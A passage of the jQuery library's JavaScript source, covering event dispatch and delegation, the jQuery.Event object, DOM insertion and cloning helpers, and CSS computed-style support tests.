            dataPriv.get( this, "events" ) || Object.create( null )
        )[ event.type ] || [],
        special = jQuery.event.special[ event.type ] || {};

    // Use the fix-ed jQuery.Event rather than the (read-only) native event
    args[ 0 ] = event;

    for ( i = 1; i < arguments.length; i++ ) {
        args[ i ] = arguments[ i ];
    }

    event.delegateTarget = this;

    // Call the preDispatch hook for the mapped type, and let it bail if desired
    if ( special.preDispatch && special.preDispatch.call( this, event ) === false ) {
        return;
    }

    // Determine handlers
    handlerQueue = jQuery.event.handlers.call( this, event, handlers );

    // Run delegates first; they may want to stop propagation beneath us
    i = 0;
    while ( ( matched = handlerQueue[ i++ ] ) && !event.isPropagationStopped() ) {
        event.currentTarget = matched.elem;

        j = 0;
        while ( ( handleObj = matched.handlers[ j++ ] ) &&
            !event.isImmediatePropagationStopped() ) {

            // If the event is namespaced, then each handler is only invoked if it is
            // specially universal or its namespaces are a superset of the event's.
            if ( !event.rnamespace || handleObj.namespace === false ||
                event.rnamespace.test( handleObj.namespace ) ) {

                event.handleObj = handleObj;
                event.data = handleObj.data;

                ret = ( ( jQuery.event.special[ handleObj.origType ] || {} ).handle ||
                    handleObj.handler ).apply( matched.elem, args );

                if ( ret !== undefined ) {
                    if ( ( event.result = ret ) === false ) {
                        event.preventDefault();
                        event.stopPropagation();
                    }
                }
            }
        }
    }

    // Call the postDispatch hook for the mapped type
    if ( special.postDispatch ) {
        special.postDispatch.call( this, event );
    }

    return event.result;
},

handlers: function( event, handlers ) {
    var i, handleObj, sel, matchedHandlers, matchedSelectors,
        handlerQueue = [],
        delegateCount = handlers.delegateCount,
        cur = event.target;

    // Find delegate handlers
    if ( delegateCount &&

        // Support: IE <=9
        // Black-hole SVG <use> instance trees (trac-13180)
        cur.nodeType &&

        // Support: Firefox <=42
        // Suppress spec-violating clicks indicating a non-primary pointer button (trac-3861)
        // https://www.w3.org/TR/DOM-Level-3-Events/#event-type-click
        // Support: IE 11 only
        // ...but not arrow key "clicks" of radio inputs, which can have `button` -1 (gh-2343)
        !( event.type === "click" && event.button >= 1 ) ) {

        for ( ; cur !== this; cur = cur.parentNode || this ) {

            // Don't check non-elements (#13208)
            // Don't process clicks on disabled elements (#6911, #8165, #11382, #11764)
            if ( cur.nodeType === 1 && !( event.type === "click" && cur.disabled === true ) ) {
                matchedHandlers = [];
                matchedSelectors = {};
                for ( i = 0; i < delegateCount; i++ ) {
                    handleObj = handlers[ i ];

                    // Don't conflict with Object.prototype properties (#13203)
                    sel = handleObj.selector + " ";

                    if ( matchedSelectors[ sel ] === undefined ) {
                        matchedSelectors[ sel ] = handleObj.needsContext ?
                            jQuery( sel, this ).index( cur ) > -1 :
                            jQuery.find( sel, this, null, [ cur ] ).length;
                    }
                    if ( matchedSelectors[ sel ] ) {
                        matchedHandlers.push( handleObj );
                    }
                }
                if ( matchedHandlers.length ) {
                    handlerQueue.push( { elem: cur, handlers: matchedHandlers } );
                }
            }
        }
    }

    // Add the remaining (directly-bound) handlers
    cur = this;
    if ( delegateCount < handlers.length ) {
        handlerQueue.push( { elem: cur, handlers: handlers.slice( delegateCount ) } );
    }

    return handlerQueue;
},

addProp: function( name, hook ) {
    Object.defineProperty( jQuery.Event.prototype, name, {
        enumerable: true,
        configurable: true,

        get: isFunction( hook ) ?
            function() {
                if ( this.originalEvent ) {
                    return hook( this.originalEvent );
                }
            } :
            function() {
                if ( this.originalEvent ) {
                    return this.originalEvent[ name ];
                }
            },

        set: function( value ) {
            Object.defineProperty( this, name, {
                enumerable: true,
                configurable: true,
                writable: true,
                value: value
            } );
        }
    } );
},

fix: function( originalEvent ) {
    return originalEvent[ jQuery.expando ] ?
        originalEvent :
        new jQuery.Event( originalEvent );
},

special: {
    load: {

        // Prevent triggered image.load events from bubbling to window.load
        noBubble: true
    },
    click: {

        // Utilize native event to ensure correct state for checkable inputs
        setup: function( data ) {

            // For mutual compressibility with _default, replace `this` access with a local var.
            // `|| data` is dead code meant only to preserve the variable through minification.
            var el = this || data;

            // Claim the first handler
            if ( rcheckableType.test( el.type ) &&
                el.click && nodeName( el, "input" ) ) {

                // dataPriv.set( el, "click", ... )
                leverageNative( el, "click", returnTrue );
            }

            // Return false to allow normal processing in the caller
            return false;
        },
        trigger: function( data ) {

            // For mutual compressibility with _default, replace `this` access with a local var.
            // `|| data` is dead code meant only to preserve the variable through minification.
            var el = this || data;

            // Force setup before triggering a click
            if ( rcheckableType.test( el.type ) &&
                el.click && nodeName( el, "input" ) ) {

                leverageNative( el, "click" );
            }

            // Return non-false to allow normal event-path propagation
            return true;
        },

        // For cross-browser consistency, suppress native .click() on links
        // Also prevent it if we're currently inside a leveraged native-event stack
        _default: function( event ) {
            var target = event.target;
            return rcheckableType.test( target.type ) &&
                target.click && nodeName( target, "input" ) &&
                dataPriv.get( target, "click" ) ||
                nodeName( target, "a" );
        }
    },

    beforeunload: {
        postDispatch: function( event ) {

            // Support: Firefox 20+
            // Firefox doesn't alert if the returnValue field is not set.
            if ( event.result !== undefined && event.originalEvent ) {
                event.originalEvent.returnValue = event.result;
            }
        }
    }
}
};

// Ensure the presence of an event listener that handles manually-triggered
// synthetic events by interrupting progress until reinvoked in response to
// *native* events that it fires directly, ensuring that state changes have
// already occurred before other listeners are invoked.
function leverageNative( el, type, expectSync ) {

// Missing expectSync indicates a trigger call, which must force setup through jQuery.event.add
if ( !expectSync ) {
    if ( dataPriv.get( el, type ) === undefined ) {
        jQuery.event.add( el, type, returnTrue );
    }
    return;
}

// Register the controller as a special universal handler for all event namespaces
dataPriv.set( el, type, false );
jQuery.event.add( el, type, {
    namespace: false,
    handler: function( event ) {
        var notAsync, result,
            saved = dataPriv.get( this, type );

        if ( ( event.isTrigger & 1 ) && this[ type ] ) {

            // Interrupt processing of the outer synthetic .trigger()ed event
            // Saved data should be false in such cases, but might be a leftover capture object
            // from an async native handler (gh-4350)
            if ( !saved.length ) {

                // Store arguments for use when handling the inner native event
                // There will always be at least one argument (an event object), so this array
                // will not be confused with a leftover capture object.
                saved = slice.call( arguments );
                dataPriv.set( this, type, saved );

                // Trigger the native event and capture its result
                // Support: IE <=9 - 11+
                // focus() and blur() are asynchronous
                notAsync = expectSync( this, type );
                this[ type ]();
                result = dataPriv.get( this, type );
                if ( saved !== result || notAsync ) {
                    dataPriv.set( this, type, false );
                } else {
                    result = {};
                }
                if ( saved !== result ) {

                    // Cancel the outer synthetic event
                    event.stopImmediatePropagation();
                    event.preventDefault();

                    // Support: Chrome 86+
                    // In Chrome, if an element having a focusout handler is blurred by
                    // clicking outside of it, it invokes the handler synchronously. If
                    // that handler calls `.remove()` on the element, the data is cleared,
                    // leaving `result` undefined. We need to guard against this.
                    return result && result.value;
                }

            // If this is an inner synthetic event for an event with a bubbling surrogate
            // (focus or blur), assume that the surrogate already propagated from triggering the
            // native event and prevent that from happening again here.
            // This technically gets the ordering wrong w.r.t. to `.trigger()` (in which the
            // bubbling surrogate propagates *after* the non-bubbling base), but that seems
            // less bad than duplication.
            } else if ( ( jQuery.event.special[ type ] || {} ).delegateType ) {
                event.stopPropagation();
            }

        // If this is a native event triggered above, everything is now in order
        // Fire an inner synthetic event with the original arguments
        } else if ( saved.length ) {

            // ...and capture the result
            dataPriv.set( this, type, {
                value: jQuery.event.trigger(

                    // Support: IE <=9 - 11+
                    // Extend with the prototype to reset the above stopImmediatePropagation()
                    jQuery.extend( saved[ 0 ], jQuery.Event.prototype ),
                    saved.slice( 1 ),
                    this
                )
            } );

            // Abort handling of the native event
            event.stopImmediatePropagation();
        }
    }
} );
}

jQuery.removeEvent = function( elem, type, handle ) {

// This "if" is needed for plain objects
if ( elem.removeEventListener ) {
    elem.removeEventListener( type, handle );
}
};

jQuery.Event = function( src, props ) {

// Allow instantiation without the 'new' keyword
if ( !( this instanceof jQuery.Event ) ) {
    return new jQuery.Event( src, props );
}

// Event object
if ( src && src.type ) {
    this.originalEvent = src;
    this.type = src.type;

    // Events bubbling up the document may have been marked as prevented
    // by a handler lower down the tree; reflect the correct value.
    this.isDefaultPrevented = src.defaultPrevented ||
            src.defaultPrevented === undefined &&

            // Support: Android <=2.3 only
            src.returnValue === false ?
        returnTrue :
        returnFalse;

    // Create target properties
    // Support: Safari <=6 - 7 only
    // Target should not be a text node (#504, #13143)
    this.target = ( src.target && src.target.nodeType === 3 ) ?
        src.target.parentNode :
        src.target;

    this.currentTarget = src.currentTarget;
    this.relatedTarget = src.relatedTarget;

// Event type
} else {
    this.type = src;
}

// Put explicitly provided properties onto the event object
if ( props ) {
    jQuery.extend( this, props );
}

// Create a timestamp if incoming event doesn't have one
this.timeStamp = src && src.timeStamp || Date.now();

// Mark it as fixed
this[ jQuery.expando ] = true;
};

// jQuery.Event is based on DOM3 Events as specified by the ECMAScript Language Binding
// https://www.w3.org/TR/2003/WD-DOM-Level-3-Events-20030331/ecma-script-binding.html
jQuery.Event.prototype = {
constructor: jQuery.Event,
isDefaultPrevented: returnFalse,
isPropagationStopped: returnFalse,
isImmediatePropagationStopped: returnFalse,
isSimulated: false,

preventDefault: function() {
    var e = this.originalEvent;

    this.isDefaultPrevented = returnTrue;

    if ( e && !this.isSimulated ) {
        e.preventDefault();
    }
},
stopPropagation: function() {
    var e = this.originalEvent;

    this.isPropagationStopped = returnTrue;

    if ( e && !this.isSimulated ) {
        e.stopPropagation();
    }
},
stopImmediatePropagation: function() {
    var e = this.originalEvent;

    this.isImmediatePropagationStopped = returnTrue;

    if ( e && !this.isSimulated ) {
        e.stopImmediatePropagation();
    }

    this.stopPropagation();
}
};

// Includes all common event props including KeyEvent and MouseEvent specific props
jQuery.each( {
altKey: true,
bubbles: true,
cancelable: true,
changedTouches: true,
ctrlKey: true,
detail: true,
eventPhase: true,
metaKey: true,
pageX: true,
pageY: true,
shiftKey: true,
view: true,
"char": true,
code: true,
charCode: true,
key: true,
keyCode: true,
button: true,
buttons: true,
clientX: true,
clientY: true,
offsetX: true,
offsetY: true,
pointerId: true,
pointerType: true,
screenX: true,
screenY: true,
targetTouches: true,
toElement: true,
touches: true,
which: true
}, jQuery.event.addProp );

jQuery.each( { focus: "focusin", blur: "focusout" }, function( type, delegateType ) {
jQuery.event.special[ type ] = {

    // Utilize native event if possible so blur/focus sequence is correct
    setup: function() {

        // Claim the first handler
        // dataPriv.set( this, "focus", ... )
        // dataPriv.set( this, "blur", ... )
        leverageNative( this, type, expectSync );

        // Return false to allow normal processing in the caller
        return false;
    },
    trigger: function() {

        // Force setup before trigger
        leverageNative( this, type );

        // Return non-false to allow normal event-path propagation
        return true;
    },

    // Suppress native focus or blur as it's already being fired
    // in leverageNative.
    _default: function() {
        return true;
    },

    delegateType: delegateType
};
} );

// Create mouseenter/leave events using mouseover/out and event-time checks
// so that event delegation works in jQuery.
// Do the same for pointerenter/pointerleave and pointerover/pointerout
//
// Support: Safari 7 only
// Safari sends mouseenter too often; see:
// https://bugs.chromium.org/p/chromium/issues/detail?id=470258
// for the description of the bug (it existed in older Chrome versions as well).
jQuery.each( {
mouseenter: "mouseover",
mouseleave: "mouseout",
pointerenter: "pointerover",
pointerleave: "pointerout"
}, function( orig, fix ) {
jQuery.event.special[ orig ] = {
    delegateType: fix,
    bindType: fix,

    handle: function( event ) {
        var ret,
            target = this,
            related = event.relatedTarget,
            handleObj = event.handleObj;

        // For mouseenter/leave call the handler if related is outside the target.
        // NB: No relatedTarget if the mouse left/entered the browser window
        if ( !related || ( related !== target && !jQuery.contains( target, related ) ) ) {
            event.type = handleObj.origType;
            ret = handleObj.handler.apply( this, arguments );
            event.type = fix;
        }
        return ret;
    }
};
} );

jQuery.fn.extend( {

on: function( types, selector, data, fn ) {
    return on( this, types, selector, data, fn );
},
one: function( types, selector, data, fn ) {
    return on( this, types, selector, data, fn, 1 );
},
off: function( types, selector, fn ) {
    var handleObj, type;
    if ( types && types.preventDefault && types.handleObj ) {

        // ( event )  dispatched jQuery.Event
        handleObj = types.handleObj;
        jQuery( types.delegateTarget ).off(
            handleObj.namespace ?
                handleObj.origType + "." + handleObj.namespace :
                handleObj.origType,
            handleObj.selector,
            handleObj.handler
        );
        return this;
    }
    if ( typeof types === "object" ) {

        // ( types-object [, selector] )
        for ( type in types ) {
            this.off( type, selector, types[ type ] );
        }
        return this;
    }
    if ( selector === false || typeof selector === "function" ) {

        // ( types [, fn] )
        fn = selector;
        selector = undefined;
    }
    if ( fn === false ) {
        fn = returnFalse;
    }
    return this.each( function() {
        jQuery.event.remove( this, types, fn, selector );
    } );
}
} );


var

// Support: IE <=10 - 11, Edge 12 - 13 only
// In IE/Edge using regex groups here causes severe slowdowns.
// See https://connect.microsoft.com/IE/feedback/details/1736512/
rnoInnerhtml = /<script|<style|<link/i,

// checked="checked" or checked
rchecked = /checked\s*(?:[^=]|=\s*.checked.)/i,
rcleanScript = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;

// Prefer a tbody over its parent table for containing new rows
function manipulationTarget( elem, content ) {
if ( nodeName( elem, "table" ) &&
    nodeName( content.nodeType !== 11 ? content : content.firstChild, "tr" ) ) {

    return jQuery( elem ).children( "tbody" )[ 0 ] || elem;
}

return elem;
}

// Replace/restore the type attribute of script elements for safe DOM manipulation
function disableScript( elem ) {
elem.type = ( elem.getAttribute( "type" ) !== null ) + "/" + elem.type;
return elem;
}
function restoreScript( elem ) {
if ( ( elem.type || "" ).slice( 0, 5 ) === "true/" ) {
    elem.type = elem.type.slice( 5 );
} else {
    elem.removeAttribute( "type" );
}

return elem;
}

function cloneCopyEvent( src, dest ) {
var i, l, type, pdataOld, udataOld, udataCur, events;

if ( dest.nodeType !== 1 ) {
    return;
}

// 1. Copy private data: events, handlers, etc.
if ( dataPriv.hasData( src ) ) {
    pdataOld = dataPriv.get( src );
    events = pdataOld.events;

    if ( events ) {
        dataPriv.remove( dest, "handle events" );

        for ( type in events ) {
            for ( i = 0, l = events[ type ].length; i < l; i++ ) {
                jQuery.event.add( dest, type, events[ type ][ i ] );
            }
        }
    }
}

// 2. Copy user data
if ( dataUser.hasData( src ) ) {
    udataOld = dataUser.access( src );
    udataCur = jQuery.extend( {}, udataOld );

    dataUser.set( dest, udataCur );
}
}

// Fix IE bugs, see support tests
function fixInput( src, dest ) {
var nodeName = dest.nodeName.toLowerCase();

// Fails to persist the checked state of a cloned checkbox or radio button.
if ( nodeName === "input" && rcheckableType.test( src.type ) ) {
    dest.checked = src.checked;

// Fails to return the selected option to the default selected state when cloning options
} else if ( nodeName === "input" || nodeName === "textarea" ) {
    dest.defaultValue = src.defaultValue;
}
}

function domManip( collection, args, callback, ignored ) {

// Flatten any nested arrays
args = flat( args );

var fragment, first, scripts, hasScripts, node, doc,
    i = 0,
    l = collection.length,
    iNoClone = l - 1,
    value = args[ 0 ],
    valueIsFunction = isFunction( value );

// We can't cloneNode fragments that contain checked, in WebKit
if ( valueIsFunction ||
        ( l > 1 && typeof value === "string" &&
            !support.checkClone && rchecked.test( value ) ) ) {
    return collection.each( function( index ) {
        var self = collection.eq( index );
        if ( valueIsFunction ) {
            args[ 0 ] = value.call( this, index, self.html() );
        }
        domManip( self, args, callback, ignored );
    } );
}

if ( l ) {
    fragment = buildFragment( args, collection[ 0 ].ownerDocument, false, collection, ignored );
    first = fragment.firstChild;

    if ( fragment.childNodes.length === 1 ) {
        fragment = first;
    }

    // Require either new content or an interest in ignored elements to invoke the callback
    if ( first || ignored ) {
        scripts = jQuery.map( getAll( fragment, "script" ), disableScript );
        hasScripts = scripts.length;

        // Use the original fragment for the last item
        // instead of the first because it can end up
        // being emptied incorrectly in certain situations (#8070).
        for ( ; i < l; i++ ) {
            node = fragment;

            if ( i !== iNoClone ) {
                node = jQuery.clone( node, true, true );

                // Keep references to cloned scripts for later restoration
                if ( hasScripts ) {

                    // Support: Android <=4.0 only, PhantomJS 1 only
                    // push.apply(_, arraylike) throws on ancient WebKit
                    jQuery.merge( scripts, getAll( node, "script" ) );
                }
            }

            callback.call( collection[ i ], node, i );
        }

        if ( hasScripts ) {
            doc = scripts[ scripts.length - 1 ].ownerDocument;

            // Reenable scripts
            jQuery.map( scripts, restoreScript );

            // Evaluate executable scripts on first document insertion
            for ( i = 0; i < hasScripts; i++ ) {
                node = scripts[ i ];
                if ( rscriptType.test( node.type || "" ) &&
                    !dataPriv.access( node, "globalEval" ) &&
                    jQuery.contains( doc, node ) ) {

                    if ( node.src && ( node.type || "" ).toLowerCase()  !== "module" ) {

                        // Optional AJAX dependency, but won't run scripts if not present
                        if ( jQuery._evalUrl && !node.noModule ) {
                            jQuery._evalUrl( node.src, {
                                nonce: node.nonce || node.getAttribute( "nonce" )
                            }, doc );
                        }
                    } else {
                        DOMEval( node.textContent.replace( rcleanScript, "" ), node, doc );
                    }
                }
            }
        }
    }
}

return collection;
}

function remove( elem, selector, keepData ) {
var node,
    nodes = selector ? jQuery.filter( selector, elem ) : elem,
    i = 0;

for ( ; ( node = nodes[ i ] ) != null; i++ ) {
    if ( !keepData && node.nodeType === 1 ) {
        jQuery.cleanData( getAll( node ) );
    }

    if ( node.parentNode ) {
        if ( keepData && isAttached( node ) ) {
            setGlobalEval( getAll( node, "script" ) );
        }
        node.parentNode.removeChild( node );
    }
}

return elem;
}

jQuery.extend( {
htmlPrefilter: function( html ) {
    return html;
},

clone: function( elem, dataAndEvents, deepDataAndEvents ) {
    var i, l, srcElements, destElements,
        clone = elem.cloneNode( true ),
        inPage = isAttached( elem );

    // Fix IE cloning issues
    if ( !support.noCloneChecked && ( elem.nodeType === 1 || elem.nodeType === 11 ) &&
            !jQuery.isXMLDoc( elem ) ) {

        // We eschew Sizzle here for performance reasons: https://jsperf.com/getall-vs-sizzle/2
        destElements = getAll( clone );
        srcElements = getAll( elem );

        for ( i = 0, l = srcElements.length; i < l; i++ ) {
            fixInput( srcElements[ i ], destElements[ i ] );
        }
    }

    // Copy the events from the original to the clone
    if ( dataAndEvents ) {
        if ( deepDataAndEvents ) {
            srcElements = srcElements || getAll( elem );
            destElements = destElements || getAll( clone );

            for ( i = 0, l = srcElements.length; i < l; i++ ) {
                cloneCopyEvent( srcElements[ i ], destElements[ i ] );
            }
        } else {
            cloneCopyEvent( elem, clone );
        }
    }

    // Preserve script evaluation history
    destElements = getAll( clone, "script" );
    if ( destElements.length > 0 ) {
        setGlobalEval( destElements, !inPage && getAll( elem, "script" ) );
    }

    // Return the cloned set
    return clone;
},

cleanData: function( elems ) {
    var data, elem, type,
        special = jQuery.event.special,
        i = 0;

    for ( ; ( elem = elems[ i ] ) !== undefined; i++ ) {
        if ( acceptData( elem ) ) {
            if ( ( data = elem[ dataPriv.expando ] ) ) {
                if ( data.events ) {
                    for ( type in data.events ) {
                        if ( special[ type ] ) {
                            jQuery.event.remove( elem, type );

                        // This is a shortcut to avoid jQuery.event.remove's overhead
                        } else {
                            jQuery.removeEvent( elem, type, data.handle );
                        }
                    }
                }

                // Support: Chrome <=35 - 45+
                // Assign undefined instead of using delete, see Data#remove
                elem[ dataPriv.expando ] = undefined;
            }
            if ( elem[ dataUser.expando ] ) {

                // Support: Chrome <=35 - 45+
                // Assign undefined instead of using delete, see Data#remove
                elem[ dataUser.expando ] = undefined;
            }
        }
    }
}
} );

jQuery.fn.extend( {
detach: function( selector ) {
    return remove( this, selector, true );
},

remove: function( selector ) {
    return remove( this, selector );
},

text: function( value ) {
    return access( this, function( value ) {
        return value === undefined ?
            jQuery.text( this ) :
            this.empty().each( function() {
                if ( this.nodeType === 1 || this.nodeType === 11 || this.nodeType === 9 ) {
                    this.textContent = value;
                }
            } );
    }, null, value, arguments.length );
},

append: function() {
    return domManip( this, arguments, function( elem ) {
        if ( this.nodeType === 1 || this.nodeType === 11 || this.nodeType === 9 ) {
            var target = manipulationTarget( this, elem );
            target.appendChild( elem );
        }
    } );
},

prepend: function() {
    return domManip( this, arguments, function( elem ) {
        if ( this.nodeType === 1 || this.nodeType === 11 || this.nodeType === 9 ) {
            var target = manipulationTarget( this, elem );
            target.insertBefore( elem, target.firstChild );
        }
    } );
},

before: function() {
    return domManip( this, arguments, function( elem ) {
        if ( this.parentNode ) {
            this.parentNode.insertBefore( elem, this );
        }
    } );
},

after: function() {
    return domManip( this, arguments, function( elem ) {
        if ( this.parentNode ) {
            this.parentNode.insertBefore( elem, this.nextSibling );
        }
    } );
},

empty: function() {
    var elem,
        i = 0;

    for ( ; ( elem = this[ i ] ) != null; i++ ) {
        if ( elem.nodeType === 1 ) {

            // Prevent memory leaks
            jQuery.cleanData( getAll( elem, false ) );

            // Remove any remaining nodes
            elem.textContent = "";
        }
    }

    return this;
},

clone: function( dataAndEvents, deepDataAndEvents ) {
    dataAndEvents = dataAndEvents == null ? false : dataAndEvents;
    deepDataAndEvents = deepDataAndEvents == null ? dataAndEvents : deepDataAndEvents;

    return this.map( function() {
        return jQuery.clone( this, dataAndEvents, deepDataAndEvents );
    } );
},

html: function( value ) {
    return access( this, function( value ) {
        var elem = this[ 0 ] || {},
            i = 0,
            l = this.length;

        if ( value === undefined && elem.nodeType === 1 ) {
            return elem.innerHTML;
        }

        // See if we can take a shortcut and just use innerHTML
        if ( typeof value === "string" && !rnoInnerhtml.test( value ) &&
            !wrapMap[ ( rtagName.exec( value ) || [ "", "" ] )[ 1 ].toLowerCase() ] ) {

            value = jQuery.htmlPrefilter( value );

            try {
                for ( ; i < l; i++ ) {
                    elem = this[ i ] || {};

                    // Remove element nodes and prevent memory leaks
                    if ( elem.nodeType === 1 ) {
                        jQuery.cleanData( getAll( elem, false ) );
                        elem.innerHTML = value;
                    }
                }

                elem = 0;

            // If using innerHTML throws an exception, use the fallback method
            } catch ( e ) {}
        }

        if ( elem ) {
            this.empty().append( value );
        }
    }, null, value, arguments.length );
},

replaceWith: function() {
    var ignored = [];

    // Make the changes, replacing each non-ignored context element with the new content
    return domManip( this, arguments, function( elem ) {
        var parent = this.parentNode;

        if ( jQuery.inArray( this, ignored ) < 0 ) {
            jQuery.cleanData( getAll( this ) );
            if ( parent ) {
                parent.replaceChild( elem, this );
            }
        }

    // Force callback invocation
    }, ignored );
}
} );

jQuery.each( {
appendTo: "append",
prependTo: "prepend",
insertBefore: "before",
insertAfter: "after",
replaceAll: "replaceWith"
}, function( name, original ) {
jQuery.fn[ name ] = function( selector ) {
    var elems,
        ret = [],
        insert = jQuery( selector ),
        last = insert.length - 1,
        i = 0;

    for ( ; i <= last; i++ ) {
        elems = i === last ? this : this.clone( true );
        jQuery( insert[ i ] )[ original ]( elems );

        // Support: Android <=4.0 only, PhantomJS 1 only
        // .get() because push.apply(_, arraylike) throws on ancient WebKit
        push.apply( ret, elems.get() );
    }

    return this.pushStack( ret );
};
} );
var rnumnonpx = new RegExp( "^(" + pnum + ")(?!px)[a-z%]+$", "i" );

var getStyles = function( elem ) {

    // Support: IE <=11 only, Firefox <=30 (#15098, #14150)
    // IE throws on elements created in popups
    // FF meanwhile throws on frame elements through "defaultView.getComputedStyle"
    var view = elem.ownerDocument.defaultView;

    if ( !view || !view.opener ) {
        view = window;
    }

    return view.getComputedStyle( elem );
};

var swap = function( elem, options, callback ) {
var ret, name,
    old = {};

// Remember the old values, and insert the new ones
for ( name in options ) {
    old[ name ] = elem.style[ name ];
    elem.style[ name ] = options[ name ];
}

ret = callback.call( elem );

// Revert the old values
for ( name in options ) {
    elem.style[ name ] = old[ name ];
}

return ret;
};


var rboxStyle = new RegExp( cssExpand.join( "|" ), "i" );



( function() {

// Executing both pixelPosition & boxSizingReliable tests require only one layout
// so they're executed at the same time to save the second computation.
function computeStyleTests() {

    // This is a singleton, we need to execute it only once
    if ( !div ) {
        return;
    }

    container.style.cssText = "position:absolute;left:-11111px;width:60px;" +
        "margin-top:1px;padding:0;border:0";
    div.style.cssText =
        "position:relative;display:block;box-sizing:border-box;overflow:scroll;" +
        "margin:auto;border:1px;padding:1px;" +
        "width:60%;top:1%";
    documentElement.appendChild( container ).appendChild( div );

    var divStyle = window.getComputedStyle( div );
    pixelPositionVal = divStyle.top !== "1%";

    // Support: Android 4.0 - 4.3 only, Firefox <=3 - 44
    reliableMarginLeftVal = roundPixelMeasures( divStyle.marginLeft ) === 12;

    // Support: Android 4.0 - 4.3 only, Safari <=9.1 - 10.1, iOS <=7.0 - 9.3
    // Some styles come back with percentage values, even though they shouldn't
    div.style.right = "60%";
    pixelBoxStylesVal = roundPixelMeasures( divStyle.right ) === 36;

    // Support: IE 9 - 11 only
    // Detect misreporting of content dimensions for box-sizing:border-box elements
    boxSizingReliableVal = roundPixelMeasures( divStyle.width ) === 36;

    // Support: IE 9 only
    // Detect overflow:scroll screwiness (gh-3699)
    // Support: Chrome <=64
    // Don't get tricked when zoom affects offsetWidth (gh-4029)
    div.style.position = "absolute";
    scrollboxSizeVal = roundPixelMeasures( div.offsetWidth / 3 ) === 12;

    documentElement.removeChild( container );

    // Nullify the div so it wouldn't be stored in the memory and
    // it will also be a sign that checks already performed
    div = null;
}

function roundPixelMeasures( measure ) {
    return Math.round( parseFloat( measure ) );
}

var pixelPositionVal, boxSizingReliableVal, scrollboxSizeVal, pixelBoxStylesVal,
    reliableTrDimensionsVal, reliableMarginLeftVal,
    container = document.createElement( "div" ),
    div = document.createElement( "div" );

// Finish early in limited (non-browser) environments
if ( !div.style ) {
    return;
}

// Support: IE <=9 - 11 only
// Style of cloned element affects source element cloned (#8908)
div.style.backgroundClip = "content-box";
div.cloneNode( true ).style.backgroundClip = "";
support.clearCloneStyle = div.style.backgroundClip === "content-box";

jQuery.extend( support, {
    boxSizingReliable: function() {
        computeStyleTests();
        return boxSizingReliableVal;
    },
    pixelBoxStyles: function() {
        computeStyleTests();
        return pixelBoxStylesVal;
    },
    pixelPosition: function() {
        computeStyleTests();
        return pixelPositionVal;
    },
    reliableMarginLeft: function() {
        computeStyleTests();
        return reliableMarginLeftVal;
    },
    scrollboxSize: function() {
        computeStyleTests();
        return scrollboxSizeVal;
    },

    // Support: IE 9 - 11+, Edge 15 - 18+
    // IE/Edge misreport `getComputedStyle` of table rows with width/height
    // set in CSS while `offset*` properties report correct values.
    // Behavior in IE 9 is more subtle than in newer versions & it passes
    // some versions of this test; make sure not to make it pass there!
    //
    // Support: Firefox 70+
    // Only Firefox includes border widths
    // in computed dimensions. (gh-4529)
    reliableTrDimensions: function() {
        var table, tr, trChild, trStyle;
        if ( reliableTrDimensionsVal == null ) {
            table = document.createElement( "table" );
            tr = document.createElement( "tr" );
            trChild = document.createElement( "div" );

            table.style.cssText = "position:absolute;left:-11111px;border-collapse:separate";
            tr.style.cssText = "border:1px solid";

            // Support: Chrome 86+
            // Height set through cssText does not get applied.
            // Computed height then comes back as 0.
            tr.style.height = "1px";
            trChild.style.height = "9px";

            // Support: Android 8 Chrome 86+
            // In our bodyBackground.html iframe,
            // display for all div elements is set to "inline",
            // which causes a problem only in Android 8 Chrome 86.
            // Ensuring the div is display: block
            // gets around this issue.
            trChild.style.display = "block";

            documentElement
                .appendChild( table )
                .appendChild( tr )
                .appendChild( trChild );

            trStyle = window.getComputedStyle( tr );
            reliableTrDimensionsVal = ( parseInt( trStyle.height, 10 ) +
                parseInt( trStyle.borderTopWidth, 10 ) +
                parseInt( trStyle.borderBottomWidth, 10 ) ) === tr.offsetHeight;

            documentElement.removeChild( table );
        }
        return reliableTrDimensionsVal;
    }
} );
} )();


function curCSS( elem, name, computed ) {
var width, minWidth, maxWidth, ret,

    // Support: Firefox 51+
    // Retrieving style before computed somehow
    // fixes an issue with getting wrong values
    // on detached elements
    style = elem.style;

computed = computed || getStyles( elem );

// getPropertyValue is needed for:
//   .css('filter') (IE 9 only, #12537)
//   .css('--customProperty) (#3144)
if ( computed ) {
    ret = computed.getPropertyValue( name ) || computed[ name ];

    if ( ret === "" && !isAttached( elem ) ) {
        ret = jQuery.style( elem, name );
    }

    // A tribute to the "awesome hack by Dean Edwards"
    // Android Browser returns percentage for some values,
    // but width seems to be reliably pixels.
    // This is against the CSSOM draft spec:
    // https://drafts.csswg.org/cssom/#resolved-values
    if ( !support.pixelBoxStyles() && rnumnonpx.test( ret ) && rboxStyle.test( name ) ) {

        // Remember the original values
        width = style.width;
        minWidth = style.minWidth;
        maxWidth = style.maxWidth;

        // Put in the new values to get a computed value out
        style.minWidth = style.maxWidth = style.width = ret;
        ret = computed.width;

        // Revert the changed values
        style.width = width;
        style.minWidth = minWidth;
        style.maxWidth = maxWidth;
    }
}

return ret !== undefined ?

    // Support: IE <=9 - 11 only
    // IE returns zIndex value as an integer.
    ret + "" :
    ret;
}


function addGetHookIf( conditionFn, hookFn ) {

// Define the hook, we'll check on the first run if it's really needed.
return {
    get: function() {
        if ( conditionFn() ) {

            // Hook not needed (or it's not possible to use it due
            // to missing dependency), remove it.
            delete this.get;
            return;
        }

        // Hook needed; redefine it so that the support test is not executed again.
        return ( this.get = hookFn ).apply( this, arguments );
    }
};
}


var cssPrefixes = [ "Webkit", "Moz", "ms" ],
emptyStyle = document.createElement( "div" ).style,
vendorProps = {};

// Return a vendor-prefixed property or undefined
function vendorPropName( name ) {

// Check for vendor prefixed names
var capName = name[ 0 ].toUpperCase() + name.slice( 1 ),
    i = cssPrefixes.length;

while ( i-- ) {
    name = cssPrefixes[ i ] + capName;
    if ( name in emptyStyle ) {
        return name;
    }
}
}

// Return a potentially-mapped jQuery.cssProps or vendor prefixed property
function finalPropName( name ) {
var final = jQuery.cssProps[ name ] || vendorProps[ name ];

if ( final ) {
    return final;
}
if ( name in emptyStyle ) {
    return name;
}
return vendorProps[ name ] = vendorPropName( name ) || name;
}


var

// Swappable if display is none or starts with table
// except "table", "table-cell", or "table-caption"
// See here for display values: https://developer.mozilla.org/en-US/docs/CSS/display
rdisplayswap = /^(none|table(?!-c[ea]).+)/,
rcustomProp = /^--/,
